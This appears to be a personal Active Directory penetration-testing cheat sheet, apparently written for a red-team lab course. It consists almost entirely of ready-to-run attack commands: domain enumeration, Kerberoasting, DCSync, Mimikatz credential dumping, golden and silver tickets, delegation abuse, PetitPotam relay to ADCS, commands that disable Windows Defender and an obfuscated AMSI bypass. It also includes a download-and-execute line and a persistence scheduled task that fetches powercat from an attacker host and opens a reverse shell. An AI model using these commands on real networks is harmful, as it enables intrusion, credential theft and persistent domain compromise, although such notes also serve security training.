# Enum-AD Environnement

Tool used:
- Powerview (https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- Impacket Script
- Most of the powershell enum can be done remotly with pywerview -> pywerview get-netuser -u <user> --hashes <hash> ...

other ...
```
pywerview -> pywerview get-netuser -u <user> --hashes <hash> -d <domain> --dc-ip <ip>
```
# RECON 

  
# DOMAIN

## Pywerview

Trust :
```
pywerview get-netdomaintrust -u <user> -p '<pwd>' -t <dc-ip>
```
  
## Powerview

Get-NetDomain / Get-NetDomain -Domain "otherdomain" (enum domain)

Get-DomainSID

Get-DomainPolicy

Get-NetDomainController / Get-NetDomainController –Domain "otherdomain"

# USER / GROUP

Get-NetUser / Get-NetUser –Username student1 (enum user)

Get-UserProperty / Get-UserProperty –Properties pwdlastset (enum user properties)

Get-NetComputer / Get-NetComputer –OperatingSystem "*Server 2016* (Get a list of computers in the current domain)

Get-NetGroup / Get-NetGroup –Domain "targetdomain" (enum group) / Get-NetGroup *admin (all grp with admin word)

Get-NetGroupMember -GroupName "Domain Admins" -Recurse (Get all the members of the Domain Admins group)

Get-NetGroup –UserName "user" (Get the group membership for a user)

Get-NetLocalGroup -ComputerName "computername" -ListGroups (List all the local groups on a machine) need privs

Get-NetLocalGroup -ComputerName "computername" -Recurse (Get members of all the local groups on a machine) need privs

Get-NetLoggedon –ComputerName "servername" (Get actively logged users on a computer) local privs

Get-LoggedonLocal -ComputerName "computername" (Get locally logged users on a computer) needs remote registry on the target

# SHARE

Invoke-ShareFinder –Verbos (Find shares on hosts in current domain)

Invoke-FileFinder –Verbose (Find sensitive files on computers in the domain)

Get-NetFileServer (Get all fileservers of the domain)

find interesting share:
```
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose -Domain "<targetDOMAIN>"
```

# OU

Get-NetOU -FullData (Get OUs in a domain)

Get-NetOU "OUFound"
```
Get-NetOU OUFound | %{Get-NetComputer -ADSPath $_} (get computer in this OU)
```
Get-NetGPO -GPOname "{AB306569-220D-43FF-B03B-83E8F4EF8081} (Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU)

# GPO

Get-NetGPO / Get-NetGPO -ComputerName "computername" (Get list of GPO in current domain)

Get-NetGPOGroup (Get GPO(s) which use Restricted Groups or groups.xml for interesting user)

Find-GPOComputerAdmin –Computername "computername" (Get users which are in a local group of a machine using GPO)

Get-NetGPO -ADSpath 'LDAP://CN={C4F31C31-6258-4991-AAAD-454934E882AE},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local'

Find-GPOLocation -UserName "user" -Verbose (Get machines where the given user is member of a specific group)

# ACLs

Get-ObjectAcl -SamAccountName "users" –ResolveGUIDs (Get the ACLs associated with the specified object)

Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbos (Get the ACLs associated with the specified prefix to be used for search)

Invoke-ACLScanner -ResolveGUID (Search for interesting ACEs)

Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "GroupName"}

Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol (Get the ACLs associated with the specified path)

# AS-REP Roast User:

```
GetNPUsers.py -hashes :<hash> -dc-ip <ip> <domain>/<user>
```

# Kerberoasting User:

```
GetUserSPN.py -hashes :<hash> -dc-ip <ip> <domain>/<user>
```

# TRUST / FOREST

Get-NetDomainTrust / Get-NetDomainTrust –Domain "domain"

Get-NetForest / Get-NetForest –Forest "forestname"

Get-NetForestDomain / Get-NetForestDomain –Forest eurocorp.local (Get all domains in the current forest)

Get-NetForestCatalog / Get-NetForestCatalog –Forest eurocorp.local (Get all global catalogs for the current forest)

Get-NetForestTrust / Get-NetForestTrust –Forest "forestname" (Map trusts of a forest)

```Get-NetForestDomain -Verbose | Get-NetDomainTrust``` (GET ALL TRUST OF A FOREST)

# User Hunting

Script: Find-PSRemotingLocalAdminAccess

/!\ really noisy /!\

Find-LocalAdminAccess –Verbose (Find all machines on the current domain where the current user has local admin access)

-- more info about this command : query the dc to get list of all the computer of the domain (Get-NetComputer) and then query each machine on the domain with "Invoke-CheckLocalAdminAccess" --

Invoke-UserHunter / Invoke-UserHunter -GroupName "RDPUsers" (Find computers where a domain admin (or specified user/group) has sessions)

Invoke-UserHunter -CheckAccess (To confirm admin access)

Invoke-UserHunter -Stealth (Find computers where a domain admin is logged-in)

//Defense -> .\NetCease.ps1 (change permissions on the netsession enum method by removing permission for authenticated users group. 

# SQL Enum

With PowerUpSQL:
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose (find accessible sql server with current user)
```
```
Get-SQLServerLinkCrawl -Instance <FQDN-SQL-Server> -Verbose (Enum server sql to check admin right)
```
#### If xp_cmdshell is enabled (or RPC out is true), command execution is possible via this command:
```
Get-SQLServerLinkCrawl -Instance <FQDN-SQL-Server> -Query "exec master..xp_cmdshell 'whoami'"
```

# Priv Esc

PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

exploit: Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student202'

Invoke-AllChecks

# APP LOCKER

Get-AppLockerPolicy -Effective

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

Upload Bypass AppLocker:
```
Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

# Disable Windows Defender

Set-MpPreference -PUAProtection 0
Set-MpPreference -DisableArchiveScanning  $true
Set-MpPreference -DisableIntrusionPreventionSystem  $true
Set-MpPreference -DisableRealtimeMonitoring $true

  
# Bypass AMSI
PS C:> S`eT-It`em ( 'V'+'aR' +'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ;( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
  
# EXPLOITATION PHASE

## DCSync right check

For specific user:

```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "<USER-TO-CHECK>") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

For all user of the domain:
```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
```

DC Sync With MIMIKATZ
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

DCSync with secretdump
```
secretsdump.py -hashes <> -just-dc-ntlm <domain>/<user>@<IP-DC>
```

### ADD DCSync Right to USER
```
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName <..USER..> -Rights DCSync -Verbose
```
# Modify Security Descriptor

### Give user right to execute remotely WMI:

```
Set-RemoteWMI -UserName <user> -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
```
exec:
```
gwmi -class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```


### Give access to winrm PS console to a user:
```
Set-RemotePSRemoting -UserName <user> -ComputerName <remotehost> -Verbose
```
exec:
```
Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

### Retrieve Hash machine without Domain Admin right:
```
Add-RemoteRegBackdoor -ComputerName <FQDN-MACHINE> -Trustee <user> -Verbose
```
exec:
```
Get-RemoteMachineAccountHash -ComputerName <FQDN-MACHINE> -Verbose
```

# PTH with Mimikatz

Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:powershell.exe"'

# Mimikatz Dump LSASS

Invoke-Mimikatz (basic)

Invoke-Mimikatz -Command '"sekurlsa::ekeys"' (to get AES keys)

Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"' (credentials like those used for scheduled tasks are stored in the credential vault)

# Golden & Silver Ticket
  
### With ticketer
```
ticketer.py -nthash <krbtgthash> -domain-sid <sid> -user-id 500 -domain <domain> <user>
```
```
getST.py -k -no-pass -dc-ip <IP> -spn cifs/<FQDNMachine> <domain>/<user>
```
```
psexec.py -k -no-pass -dc-ip <IP> -target-ip <IP> <domain>/<user>@<FQDNMachine>
```
### With Mimikatz
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:<..> /sid:<..> /target:<FQDN> /service:HOST /rc4:<hash> /user:Administrator /ptt'" (silver)
```
# Enum Delegation
```
python3 findDelegation.py <domain>/<user>:<pass> -dc-ip <ip>
```
# BloodHound

Set up & Run BloodHound:

Install & Run neo4j:
```
neo4j.bat install service
neo4j.bat start
```

Run BloodHound:
```
Import-Module SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Verbose

# ------ Run It Once Again to gather more information about established sessions ------#

Invoke-Bloodhound -CollectionMethod LoggedOn -Verbose
```

Then you can upload the 2 .zip file on BloodHound 

# Load script through PSSESSION
```
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $sess
```
upload script:
```
Copy-Item -ToSession $appsrv1 -Path C:\AD\Tools\Rubeus.exe -Destination C:\Users\appadmin\Downloads
```
# Download and execute script in memory
```
iex (New-Object Net.WebClient).DownloadString('http://<IP:PORT>/<script>.ps1')
```
# Kerberoasting - ASK TGS

find:
```
crackmapexec ldap <dcip> -u <user> -p <password> --kdcHost <dcip> --kerberoasting output.txt
```
crack TGS offline:
```
hashcat -m 13100 <hash> -a 0 <wordlist> -o outputfile.txt
```

# AS-REP - ASK TGT
find:
```
crackmapexec ldap <dcip> -u <user> -p <password> --kdcHost <dcip> --asreproast output.txt
```
crack TGT offline:
```
hashcat -m 18200 <hash> -a 0 <wordlist> -o outputfile.txt
```

# Abuse ACL

### Set AS-REP to user
```
Set-DomainObject -Identity <User> -XOR @{useraccountcontrol=4194304} -Verbose
```
### Set SPN to user
```
Set-DomainObject -Identity <User> -Set @{serviceprincipalname='dcorp/<whateverServiceName>'} -Verbose
```
  
# Unconstrained Delegation
find
```
findDelegation.py <domain>/<user>:<pass> -dc-ip <IP>
```
or
```
Get-NetComputer -Unconstrained
```
  
If local priv admin, possibility to dump ticket and re-use it:

dump:
```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```
re-use/inject:
```
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user500\[0;1a5d18]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```

### CAN ALSO use the printer bug:

monitor ticket with rubeus:
```
.\Rubeus.exe monitor /interval:5 /nowrap
```
trigger printer bug:
```
python3 printbug.py dollarcorp.moneycorp.local/student202:t3dBtZYM4dWh5iKM@172.16.2.1 dcorp-appsrv.dollarcorp.moneycorp.local
```
then inject the tgt:
```
.\Rubeus.exe ptt /ticket:<ticket>
```
  
# Constrained delegation
### with rubeus
asktgt for the server/user with constrained delegation:
```
.\Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<user> /ptt
```
asktgs with previous tgt and impersonate domain admin:
```
.\Rubeus.exe s4u /domain:<domain> /impersonateuser:Administrator /msdsspn:"<service>" /ticket:<TGT> /ptt
```
### with impacket 
asktgt for the server/user with constrained delegation:
```
getTGT.py -hashes :<hash> <domain>/<user-with-consstrainedDELEG> -dc-ip <ip>
```
asktgs with previous tgt and impersonate domain admin:
```
getST.py -k -no-pass -dc-ip <ip> -spn <service> -impersonate Administrator <domain>/<user>
```
for example, we could psexec if delegate for cifs:
```
psexec.py <domain>/<user-impersonate>@<FQDN-TargetMachine> -k -no-pass -target-ip <ip> -dc-ip <ip>
```
  
### we can request tgs for another service since there is no sname validation:
  
### With kekeo 
  

ask TGT:
```
tgt::ask /user:<user-or-machine$> /domain:<domain> /rc4:<hash>
```
ask tgs and force ldap service tgs:
```
tgs::s4u /tgt:<TGT-Generated-Before>/user:<user>@<domain> /service:<service>|<service_to_add>
```

ex: 
```
tgs::s4u /tgt:<TGT-Generated-Before>/user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.local|ldap/dcorp-dc.dollarcorp.moneycorp.local
```
then inject the ticket with mimikatz:
```
Invoke-Mimikatz -Command '"kerberos::ptt <Ticket.kirbi>"'
```
or
### with rubeus
```
.\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /impersonateuser:Administrator /msdsspn:"time/dcorp-dc.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
-> then we can dcsync with mimikatz because we got ldap tgs as domain admin

# Pivoting/escalate domain/forest trust with domain trust key

ask tgt as enterprise admin with the domain trust key:
```
Invoke-Mimikatz -Command '"kerberos::golden /user:<anyuser> /domain:<current-domain> /sid:<sid-current-domain> /sids:<sid-target-domain>-519 /rc4:<trust-key> /service:krbtgt /target:<target-DOMAIN>"'
```
ask tgs:
```
Rubeus.exe asktgs /ticket:<ticket-created-before> /service:cifs/<FQDN-DomainController> /dc:<target-dc> /ptt
```
-> then exploit the cifs tgs as enterprise admin :)

# Pivoting/escalate domain/forest with krbtgt hash
create inter-realm tgt:
```
Invoke-Mimikatz -Command '"kerberos::golden /user:<anyuser> /domain:<current-domain> /sid:<sid-current-domain> /sids:<sid-target-domain>-519 /krbtgt:<hash>"'
```
Inject the TGT ticket
```
Invoke-Mimikatz -Command '"kerberos::ptt <Ticket-Path>"'
```
#### then exploit the tgt as enterprise admin :) (can use kekeo_old and asktgs then inject the ticket in lsass)
  
# DONPAPI
  
extract credz:
```
DonPAPI.py --hashes :<NT> domain/user@target
```

# DCSHADOW
  
  useless :)
--------------------------------------------------------------

# Check LIST

− Users

− Computers

− Domain Administrators

− Enterprise Administrators

− Shares

-----------------------------------------

− List all the OUs

− List all the computers in the StudentMachines OU. -> Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}

− List the GPOs

− Enumerate GPO applied on the StudentMachines OU

-----------------------------------------

− ACL for the Users group

− ACL for the Domain Admins group

− All modify rights/permissions for the studentx

-----------------------------------------

- Enumerate all domains in the moneycorp.local forest.

- Map the trusts of the dollarcorp.moneycorp.local domain.

- Map External trusts in moneycorp.local forest.

- Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?

-----------------------------------------

- Exploit a service on dcorp-studentx and elevate privileges to local administrator.

- Identify a machine in the domain where studentx has local administrative access.

- Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.

-----------------------------------------


-----------------------------------------


-----------------------------------------

Check SPN -> kerberoasting -> crack offline hash

AS-REPs Roasting -> ASKTGT for the specific user

Find Delegation : Unconstrained / Constrained

Check DNSAdmin right

Check TGT or TGS in memory of compromise machine


# Persistance
  
Via schedule task (ex: when u get silver ticket to a dc):
  ```
   schtasks /create /S <COMPUTER> /SC
Weekly /RU "NT Authority\SYSTEM" /TN myTask /TR "powershell.exe -c 'iex
(New-Object Net.WebClient).DownloadString(''http://<my_ip_addr>/powercat''');salut -c <ip> <port> -e cmd'"

 schtasks /Run /S <COMPUTER> /TN myTask
  ```

DSRM persistance

Custom SSP -> clear text password

AdminSDHolder persistance

Give ACL perm DCSync to a user

Security Descriptors -> modif remote access methods for specific user (wmi)

Skeleton Key (!!!!!!)


-----------------------------------------------------------------------------

### Impacket
```python3 findDelegation.py -hashes <:hash> FQDN/user -dc-ip <ip>```
### Pywerview 
```pywerview get-netuser -u cturpin --hashes 8432ec4c4f9b9ce96b73a6451a1d9dcc -d telecorp.local -t DC-01 --dc-ip 10.10.50.15 --unconstrained```
  
  
  
-------------------------------------------------------------------------------------------------
  
CHECK LIST:

GATHERING BASIC INFO:
- ENUM DOMAIN ADMIN GRP
- ENUM DOMAIN
- ENUM USER
- ENUM GROUP
- ENUM GPO & OU
- ENUM ACL USERS/GROUPS (to check interesting perms)
- ENUM COMPUTER (nmap machine found)
- RUN BLOODHOUND (check shortest path to domain admins)
- ENUM TRUST
- ENUM SHARE

-> FIND SERVER WHERE COMPROMISED USER AS ACCESS AND WHERE DOMAIN ADMIN IS LOGGED IN.

-> WHEN COMPROMISE MACHINE -> DUMP SAM BASE -> FindLocalAdminAccess

-------------------------------------------------------------------------------------------------

# TGS:
![image](https://user-images.githubusercontent.com/76106120/166111452-bf1b24dd-7586-447e-afa2-fe81cce4435d.png)

great ressource: https://book.hacktricks.xyz/windows/active-directory-methodology/silver-ticket

-------------------------------------------------------------------------------------------------

## SHADOW CREDENTIALS

Possibilité de se connecter avec un clé privité/publique sur l'AD.
Si un user peut modifier l'attribut msDS-KeyCrendentialsLink d'autre user,
il peut modifier cet attribut et donc se logger sous ce compte avec la clé privé sans aucun mdp.

## Get DOMAIN SID

rcp: 
  
domain sid:

![image](https://user-images.githubusercontent.com/76106120/176701035-9f6f5df4-1ab5-4623-83af-34397c265bd1.png)
  
user enum sid:
  
  ![image](https://user-images.githubusercontent.com/76106120/176701401-d459ec68-5ebe-4e0f-bc38-c912b9d645c4.png)


  ------------------------------------------------------------------------------------------------
  
  ## NET COMMAND (ONLY ON Windows Domain Controller)
  
  List Domain Admins :
  
  ```
  C:\>net group "Domain Admins"
  ```
  
  Add new USER to the Domain
  
  ```
  C:\>net user Teaq azerty123 /ADD
  ```
  
  ADD user to Domain Admins GROUP
  
  ```
  C:\>net group "Domain Admins" Teaq /ADD /DOMAIN
  ```
  
  ## Manual ENUM Windows
  
 Search file name and pause it until press cmd:
  
  ```
  dir c:\*.txt /w/o/s/p
  ```

--------------------------------------------------------------------------------------------------------
  
## ADCS
  
#### Find ADCS instance (need creds) :
  
```
certipy find -u <user> -hashes <:hashNT> -dc-ip <IP>
```
then cat the vulnerable certificates :

```
cat xxxxxxx_Certipy.txt | grep Vulnerabilities -A 1 -B 32
```

#### Start Listener on our Machine with the vulnerable certificate

```
impacket-ntlmrelayx -t http://<IpADCSServer>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```
  
#### Trigger authentication of the DC with PetitPotam

```
python3 PetitPotam.py -u <user> -hashes <:hashNT> -d <domain> -dc-ip <ip> <ipLISTENER> <ipTARGET>
```

to use certificate base 64 on linux, take a look here : https://gist.github.com/Flangvik/15c3007dcd57b742d4ee99502440b250
or use rubeus :(

## Enum SID Domain

```
nltest /trusted_domains /v
```
  
